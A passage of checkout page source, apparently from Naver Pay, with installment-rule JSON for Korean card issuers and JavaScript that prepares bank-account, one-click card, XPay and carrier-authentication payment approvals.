me":"PG","minamt":"300000"}],"C0":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"2","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"3","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"4","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"5","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"6","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004007","month":"7","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004017","month":"10","corpcd":"C0","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","partmos":"1,2,3,4,5","chrgtype":"01","frinttypename":"부분","frintseq":"10004008","month":"12","corpcd":"C0","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C1":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"2","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"3","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"4","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"5","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"6","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004011","month":"7","corpcd":"C1","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004012","month":"10","corpcd":"C1","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004013","month":"12","corpcd":"C1","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C2":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"2","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"3","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"4","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"5","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"6","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004034","month":"7","corpcd":"C2","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C3":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"2","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"3","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"4","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"5","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"6","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004006","month":"7","corpcd":"C3","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004009","month":"10","corpcd":"C3","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004010","month":"12","corpcd":"C3","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C4":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"2","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"3","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"4","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"5","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004031","month":"6","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004107","month":"7","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004107","month":"8","corpcd":"C4","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004032","month":"10","corpcd":"C4","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004033","month":"12","corpcd":"C4","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C5":[{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313810","month":"12","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313810","month":"18","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313810","month":"24","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313810","month":"36","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313809","month":"12","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313809","month":"18","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313809","month":"24","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","chrgtype":"01","partmos":"","frinttypename":"","cardproductcode":"C313809","month":"36","corpcd":"C5","frinttype":"03","corpname":"","chrgtypename":"PG","minamt":"300000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004024","month":"2","corpcd":"C5","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004024","month":"3","corpcd":"C5","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004024","month":"4","corpcd":"C5","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"}],"C7":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"2","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"3","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"4","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"5","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004019","month":"6","corpcd":"C7","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004020","month":"10","corpcd":"C7","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4,5","chrgtype":"01","frinttypename":"부분","frintseq":"10004021","month":"12","corpcd":"C7","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4,5,6,7","chrgtype":"01","frinttypename":"부분","frintseq":"10004022","month":"18","corpcd":"C7","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4,5,6,7,8,9","chrgtype":"01","frinttypename":"부분","frintseq":"10004023","month":"24","corpcd":"C7","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"CA":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"2","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"3","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"4","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"5","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"6","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"7","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004028","month":"8","corpcd":"CA","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004029","month":"10","corpcd":"CA","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004030","month":"12","corpcd":"CA","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}],"CB":[{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"2","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"3","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"4","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"5","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"6","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"","chrgtype":"01","frinttypename":"전체","frintseq":"10004014","month":"7","corpcd":"CB","frinttype":"01","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3","chrgtype":"01","frinttypename":"부분","frintseq":"10004123","month":"10","corpcd":"CB","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"},{"chrgpct":"0","partmos":"1,2,3,4","chrgtype":"01","frinttypename":"부분","frintseq":"10004124","month":"12","corpcd":"CB","frinttype":"02","corpname":"","chrgtypename":"PG","minamt":"50000"}]},
					"isWindow" : true,
					"cphSmplRegYn" : "N",
					"cphSmplAgrYn" : "N",
					"cphSmplCorpCd" : " ",
					"cphSmplPayNo" : " ",
					"appliedPinPay" : true,
					"expDate" : "20220316",
					"isNaverPayPasswordAvailable" : false,
					"" : ""
					});
					
					
					nmp.registerModule(nmp.front.order.order_sheet.storage, {
						"orderSnapshotKey":"b78c81ab-8b44-486f-a3da-75000ef66b86",
						"exposurePayLaterTutorial" : false
					});
					
					
					nmp.registerModule(nmp.front.order.order_glad, {
						"gfdUrl" : "http://internal.pay.naver.com/ad/seg",
						"divId" : "chargePointTabBanner",
						"unitId" : "p_pay_dicon_point",
						"spwp" : spwp
					});
					</script>
																				   
					<script type="text/javascript">
					
					
					function init_40A() {
						return true;
					}
					
					
					function getUrl_40A() {
						var url = "";
								url = "http://pay.naver.com/send";
						return url;
					}
					
					function pgApproval_40A(fm) {
						return "success";
					}
					function approval_40A(common, form, callbackFn, callbackFn2) {
					
						bill.variable._lastCallbackFn = callbackFn;
						bill.variable._returnForm = form;
						bill.variable._returnCommonForm = common;
					
						var cKey = common.value('CKEY');
					
						bill.initAccountInfo(function(success){
							if(!success){ 
								callbackFn('error');
								return;
							}
					
							var _callbackApproval = function() {
								if(cKey) {
									form.value('ACCTKEY', cKey);
								}
								var result = pgApproval_40A(form.$value());
								callbackFn( result );
							};
					
							if(cKey){
								return _callbackApproval();
							} else {
								//기존 로직, 하위호환성 보장을 위해 남겨둠. 복수계좌건에 대해 페이 모두 배포하면 삭제해도 무방.
								var resultCode = bill.variable._oneClickBankInfo.$("resultCode");
								var bankCd = bill.variable._oneClickBankInfo.$("bnkCd");
								var corpCd = common.value('CORPCD');
										
								if((bankCd == corpCd) && resultCode == '1001') {
									var bankCd = bill.variable._oneClickBankInfo.$("bnkCd");
									var input_rurl = common.value('RURL');
									var input_curl = common.value('CURL');
									var corpCd = common.value('CORPCD');
									if (bill.variable._device == 'MOBILE') {
										regType = 'I';
										var getParams = "/m/account/verifyDepositAuth?returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
										
										
										var tForm = document.getElementById("pgForm_40A");
										tForm.action=getUrl_40A()+getParams;
										tForm.target=common.value('PREIFRAME');
										if (typeof callbackFn2 == 'function') {
											common.value('MSG','success');
											common.value('PGFORMNAME','pgForm_40A');
											common.value('CHARSET', 'euc-kr');
											callbackFn2(common.$value());
										} else {
											tForm.submit();
										}
										
									} else {
										input_rurl+='?mode=P';
										input_curl+='?mode=P';
										regType = 'P';
										var getParams = "/p/account/verifyDepositAuth?returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
										bill.getForm(getUrl_40A()+getParams, regType, 'approval_frame_40A');
									}
								} else {
									var bankCd = bill.variable._oneClickBankInfo.$("bnkCd");
									if (bankCd == 'undefined' || bankCd == '' || bankCd == null || bankCd == 'null') {
										
										var input_rurl = common.value('RURL');
										var input_curl = common.value('CURL');
										var corpCd = common.value('CORPCD');
										if (bill.variable._device == 'MOBILE') {
											regType = 'I';
											var getParams =  "/m/account/registerAccount"+"?bankCode="+encodeURIComponent(corpCd)+"&returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
										
											var tForm = document.getElementById("pgForm_40A");
											tForm.action=getUrl_40A()+getParams;
											tForm.target=common.value('PREIFRAME');
											if (typeof callbackFn2 == 'function') {
												common.value('MSG','success');
												common.value('PGFORMNAME','pgForm_40A');
												common.value('CHARSET', 'euc-kr');
												callbackFn2(common.$value());
											} else {
													tForm.submit();
											}
										} else {
											input_rurl+='?mode=P';
											input_curl+='?mode=P';
											regType = 'P';
											var getParams = "/p/account/registerAccount"+"?bankCode="+encodeURIComponent(corpCd)+"&returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
											bill.getForm(getUrl_40A()+getParams, regType, 'approval_frame_40A');
										}
									} else {
										var bankCd = bill.variable._oneClickBankInfo.$("bnkCd");
										var corpCd = common.value('CORPCD');
										if(bankCd != corpCd){
											var resultCode = bill.variable._oneClickBankInfo.$("resultCode");
											if(resultCode == '1001'){
												msg = '등록대기 상태의 계좌가 있습니다. 다른 계좌를 등록하시려면 등록대기 상태 계좌는 삭제됩니다. 계속 진행하시겠습니까?';
												if(confirm(msg)){
													bill.commonTransferDataWithJsonp(bill.variable._removeAccountUrl,$H({rsvseq : common.value('RSVSEQ'), chnl : common.value('CHNL'), userkey : common.value('USERKEY'), NAMES :"rsvseq, chnl, userkey"})
														, function(result){
														if( result == 'error'){ callbackFn('error');}
														else if( result.rtncd == '000'){
															form.value('MSG',result.msg);
															callbackFn('nomatcherror');
														}else{
															var input_rurl = common.value('RURL');
															var input_curl = common.value('CURL');
															var corpCd = common.value('CORPCD');
															if (bill.variable._device == 'MOBILE') {
																regType = 'I';
																var getParams =  "/m/account/registerAccount"+"?bankCode="+encodeURIComponent(corpCd)+"&returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
																
																var tForm = document.getElementById("pgForm_40A");
																tForm.action=getUrl_40A()+getParams;
																tForm.target=common.value('PREIFRAME');
																if (typeof callbackFn2 == 'function') {
																	common.value('MSG','success');
																	common.value('PGFORMNAME','pgForm_40A');
																	common.value('CHARSET', 'euc-kr');
																	callbackFn2(common.$value());
																} else {
																		tForm.submit();
																}
															} else {
																input_rurl+='?mode=P';
																input_curl+='?mode=P';
																regType = 'P';
																var getParams = "/p/account/registerAccount"+"?bankCode="+encodeURIComponent(corpCd)+"&returnUrl=" + encodeURIComponent(input_rurl) + "&cancelUrl=" + encodeURIComponent(input_curl);
																bill.getForm(getUrl_40A()+getParams, regType, 'approval_frame_40A');
														
															}
															
														}
														
													})		
												}else{
													callbackFn('error');
												}	
											}else{
												var msg = '신규계좌 등록은 네이버페이 > 설정 > 결제/송금 계좌관리에서 가능하며, 등록 후에도 계좌가 보이지 않으면 주문서를 새로고침 해주세요.';
												alert(msg);
												location.reload();
											}
											
										}else{
											return _callbackApproval();
										}
									}
								}
							}
					
						}, cKey);
					}
					
					</script>
					<!-- iframe?? ??????吏? ?븡?? 寃? -->
					
					<div id="51A_OBJECT"></div>
					<script type="text/javascript">
					
					//pg사 carcd로 변환하는 코드를 생성한다.
					var bill_oneClickCardcdMap = $H();
					bill_oneClickCardcdMap.add('C0','CCLG');
					bill_oneClickCardcdMap.add('C1','CCBC');
					bill_oneClickCardcdMap.add('C3','CCKM');
					bill_oneClickCardcdMap.add('C4','CCNH');
					bill_oneClickCardcdMap.add('C5','CCLO');
					bill_oneClickCardcdMap.add('C7','CCSS');
					bill_oneClickCardcdMap.add('C9','CCCT');
					bill_oneClickCardcdMap.add('CA','CCKE');
					bill_oneClickCardcdMap.add('CB','CCPH');
					bill_oneClickCardcdMap.add('CF','CCHN');
					bill_oneClickCardcdMap.add('CH','CCDI');
					bill_oneClickCardcdMap.add('CP','CCKA');
					
					//pg사 carcd로 변환하는 코드를 생성한다.
					var bill_oneClickCardQuotaMap = $H();
					bill_oneClickCardQuotaMap.add('01','0' );
					bill_oneClickCardQuotaMap.add('02','2' );
					bill_oneClickCardQuotaMap.add('03','3' );
					bill_oneClickCardQuotaMap.add('04','4' );
					bill_oneClickCardQuotaMap.add('05','5' );
					bill_oneClickCardQuotaMap.add('06','6' );
					bill_oneClickCardQuotaMap.add('07','7' );
					bill_oneClickCardQuotaMap.add('08','8' );
					bill_oneClickCardQuotaMap.add('09','9' );
					bill_oneClickCardQuotaMap.add('10','10' );
					bill_oneClickCardQuotaMap.add('11','11' );
					bill_oneClickCardQuotaMap.add('12','12' );
					bill_oneClickCardQuotaMap.add('18','18' );
					bill_oneClickCardQuotaMap.add('24','24' );
					bill_oneClickCardQuotaMap.add('36','36' );
					
					
					function convertCardCd_51A(cardcd){
						if(bill_oneClickCardcdMap.hasKey(cardcd)) {
							return bill_oneClickCardcdMap.$(cardcd);
						}
						return '';
					}
					function convertToNonzeroMonth(month){
						if(month.charAt('0') == '0'){
							return month.charAt('1');
						}
						else{
							return month;
						}
					}
					
					var bill_oneClickCardIspMap = $H();
					bill_oneClickCardIspMap.add('42','0100' );
					bill_oneClickCardIspMap.add('35','1600' );
					bill_oneClickCardIspMap.add('34','1800' );
					bill_oneClickCardIspMap.add('33','0100' );
					bill_oneClickCardIspMap.add('31','0100' );
					bill_oneClickCardIspMap.add('11','0204' );
					bill_oneClickCardIspMap.add('46','1500' );
					
					function convertIspMap_51A(cardcd){
						if(bill_oneClickCardIspMap.hasKey(cardcd)) {
							return bill_oneClickCardIspMap.$(cardcd);
						}
						return '';
					}
					
					function convertQuota_51A(quota){
						if(bill_oneClickCardQuotaMap.hasKey(quota)) {
							return bill_oneClickCardQuotaMap.$(quota);
						}
						return '';
					}
					
					function init_51A() {
						return true;
					}
					
					function pgApproval_51A(fm) {
						return "success";	
					}
					
					function approval_51A(common, form, callbackFn, callbackFn2) {
						bill.variable._lastCallbackFn = callbackFn;
						bill.variable._returnForm = form;
						bill.variable._returnCommonForm = common;
						var ckey = common.value('CKEY');
						
						bill.initOneClickCardInfo(function(success){
							if(!success){ 
								callbackFn('error');
								return;
							}
					
							var install = convertQuota_51A(common.value('INSTMO'));
							if(install == '') {
								install = "00";
							} else if( install.length == 1) {
								install = "0" + install;
							}
							form.value('OC_INSTMO', install);
							
							form.value('PGID', bill.convertPgId('51277', common.value('CORPCD'), install, common.value('AMT')));
							form.value('mid_common', bill.convertPgMid('51277', common.value('CORPCD'), install, 'naver_smartstore05', common.value('AMT')));
							form.value('mid_point', bill.convertPgSubMid('51277', common.value('CORPCD'), install, 'naver_smartstore05', common.value('AMT')));
							
							if (bill.isDefermentPay('51277', common.value('CORPCD'), install, common.value('AMT'))) {
								form.value('OC_NOINT_NDISP', '1');
							} else {
								form.value('OC_NOINT_NDISP', '');
							}
							
							if(common.value('POINTFG') == 'Y' ) {
								form.value('OC_POINTUSE', 'Y');	
								form.value('OC_MID', form.value('mid_point'));
							} else {
								form.value('OC_POINTUSE', 'N');	
								form.value('OC_MID', form.value('mid_common'));
							}
							
							if( common.value('NOINTEREST') == 'Y' && common.value('NOINTERESTTYPE') == '01') {
								form.value('OC_NOINT', '1');	
							} else {
								form.value('OC_NOINT', '0');
							}
					
							var regType = 'P';
							form.value('OC_REGTYPE', regType);
							var input_rurl = common.value('RURL');
							var input_curl = common.value('CURL');
							var corpCd = common.value('CORPCD');
					
							if (ckey){
								form.value('AUTHNO', ckey);
								common.value('AUTHNO', ckey);
							} else{
								var virSeq = bill.findOneClickCardInfo(common.value('CORPCD'));
								if (virSeq == 'undefined' || virSeq == '' || virSeq == null || virSeq == 'null') {
									alert('결제하려는 카드가 등록되어 있지 않습니다. 결제정보를 다시 확인해주세요.');
									return;
								} else {
									form.value('AUTHNO', virSeq);
									common.value('AUTHNO', virSeq);
								}
							}
					
							var result = pgApproval_51A(form.$value());
							callbackFn( result );
					
						}, ckey);
						
					}
					</script>
					
					<script language="javascript" src="http://xpay.uplus.co.kr/xpay/js/xpay_crossplatform.js" type="text/javascript"></script>
					<script type="text/javascript">
					var bill_bankcdMap = $H();
					bill_bankcdMap.add('002','02');
					bill_bankcdMap.add('003','03');
					bill_bankcdMap.add('004','04');
					bill_bankcdMap.add('005','05');
					bill_bankcdMap.add('007','07');
					bill_bankcdMap.add('011','11');
					bill_bankcdMap.add('020','20');
					bill_bankcdMap.add('209','209');
					bill_bankcdMap.add('023','23');
					bill_bankcdMap.add('230','230');
					bill_bankcdMap.add('240','240');
					bill_bankcdMap.add('243','243');
					bill_bankcdMap.add('269','269');
					bill_bankcdMap.add('027','27');
					bill_bankcdMap.add('278','278');
					bill_bankcdMap.add('031','31');
					bill_bankcdMap.add('032','32');
					bill_bankcdMap.add('034','34');
					bill_bankcdMap.add('035','35');
					bill_bankcdMap.add('037','37');
					bill_bankcdMap.add('039','39');
					bill_bankcdMap.add('045','45');
					bill_bankcdMap.add('048','48');
					bill_bankcdMap.add('071','71');
					bill_bankcdMap.add('081','81');
					bill_bankcdMap.add('088','88');
					bill_bankcdMap.add('092','92');
					
					function convertBankCd_04F(bankcd){
						if(bill_bankcdMap.hasKey(bankcd)) {
							return bill_bankcdMap.$(bankcd);	
						}
						return '';
					}
					
					function init_04F() {
					
					}
					
					function pgApproval_04F(fm, svccode) {
						lgdwin = openXpay(fm, svccode, 'iframe', null, "520", "520");
					}
					
					function approval_04F(common, form, callbackFn) {
						bill.variable._lastCallbackFn = callbackFn;
						bill.variable._returnForm = form;
						bill.variable._returnCommonForm = common;
						
						form.value('LGD_BUYER', common.value('USERID'));
						form.value('LGD_PRODUCTINFO', common.value('TITLE'));
						form.value('LGD_AMOUNT', common.value('AMT'));
						form.value('LGD_OID', common.value('SID'));
						form.value('LGD_RETURNURL', common.value('RURL'));
						
						//PG 모듈 호출
						var result = pgApproval_04F(form.$value(), "service");
					}
					</script><script type="text/javascript">
					function pgApproval_60A(fm) {
						return 'success';
					}
					
					function init_60A() {
						;
					}
					
					function approval_paramInit_60A(form) {
						form.value('mUserKey','');
						form.value('Okurl', '');
						form.value('Cryptstring', '');
						form.value('Failurl', '');
						form.value('Prdtprice', '');
					}
					
					function approval_60A(common, form, callbackFn, callbackFn2) {
						var result;
						approval_paramInit_60A(form);
						
						var command = "NAVER_NJOIN"; 
						if (bill.variable._device == "MOBILE") {
							command = "NAVER_NJOIN_M"; 
						}
						
						if (common.value('JOINSTATUS') == 'N') {
							form.value('JOIN_STATUS', 'N');
						}
						
						if (common.value('LOSTPWCHANGEFG') == "Y") {
							form.value('MC_JOIN_TYPE', 'A');
							pgApproval_60A_auth(common, form, command, callbackFn, callbackFn2);
						}else if (common.value('ISSKNORMALUSER') == 'NONE' && form.value('JOIN_STATUS') != "Y") {
							form.value('MC_JOIN_TYPE', 'J');
							pgApproval_60A_auth(common, form, command, callbackFn, callbackFn2);
						} else {
							result = pgApproval_60A(form.$value()); 
							callbackFn( result );
						}
					}
					
					
					function pgPreApproval_06A_DELIVERAUTH (common, form) {
						var str = {
						cpid : 'shopN',
						pgcd : '60', 
						NAMES :"cpid, pgcd"
						};
						return str;
					}
					
					function pgApproval_60A_auth(common, form, type, callbackFn, callbackFn2) {
						bill.variable._lastCallbackFn = callbackFn;
						bill.variable._returnForm = form;
					
						var preCertApprovalString = pgPreApproval_06A_DELIVERAUTH(common, form);	
						bill.commonTransferData(bill.variable._preCertUrl, $H(preCertApprovalString), function(str){
							if( str == 'error'){ callbackFn('error');}
							
							var orgCharset = document.charset;
							form.value('MC_SVCID', str.mkey1);
							form.value('smobileSid', str.sid);
							var Cryptstring	= common.value('AMT') + common.value('RURL');
							bill.encryptWithCors('enc','60A',$H({Okurl : common.value('RURL'), Cryptstring :Cryptstring, Failurl : common.value('CURL'), Notiurl : common.value('RURL'), Prdtprice : common.value('AMT'), HASHKEY: str.sid, VER : "2", NAMES : 'Okurl, Failurl, Notiurl, Prdtprice, Cryptstring, VER, HASHKEY'}), 
								function(result){
									if( result == 'error'){ callbackFn('error');}
									form.value('Cryptstring', result.Cryptstring);
									form.value('Okurl', result.Okurl);
